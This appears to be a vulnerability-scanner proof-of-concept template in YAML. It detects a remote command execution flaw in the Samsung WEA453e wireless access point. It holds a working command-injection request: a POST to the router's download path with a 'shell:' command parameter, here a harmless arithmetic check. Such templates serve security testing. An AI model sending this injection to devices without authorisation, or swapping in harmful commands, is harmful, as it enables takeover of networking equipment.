detail:
  author: sharecast
  links:
  - https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
expression: r0()
manual: true
name: poc-yaml-samsung-wea453e-rce
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      - r2)))
    request:
      body: 'command1=shell%3Aexpr {{r1}} - {{r2}}|dd of=/tmp/1.txt

        '
      cache: true
      follow_redirects: false
      method: POST
      path: /(download)/tmp/1.txt
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(1140000, 1144800)
transport: http
